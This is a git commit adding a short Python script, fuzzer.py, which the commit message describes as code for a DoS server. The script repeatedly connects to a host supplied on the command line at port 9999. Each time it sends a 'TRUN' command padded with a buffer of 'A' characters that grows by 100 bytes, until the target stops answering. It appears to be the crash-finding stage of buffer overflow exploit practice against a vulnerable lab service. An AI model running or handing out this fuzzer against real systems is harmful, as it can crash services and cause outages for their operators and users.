ff6371e80d317c50e9a65ff79feec03f645abf84
siko1305 <116225835+siko1305@users.noreply.github.com>
2023-03-06 22:07:18 +0300

    Add files via upload
    This is python code for Dos server

---
+++ fuzzer.py
@@ -0,0 +1,25 @@
+import socket
+import time
+import sys
+
+
+
+buf = b'A' * 100
+host = sys.argv[1]
+port = 9999
+
+
+while True:
+	try: 
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host, port))
+		s.recv(1024)
+		print(f'[*] FUZZING with {str(len(buf))} bytes')
+		s.send(b'TRUN /.:/' + buf + b'\r\n')
+		buf += b'A' * 100
+		s.close()
+		time.sleep(1)
+
+	except:
+		print('[!] ERROR')
+		sys.exit(0)
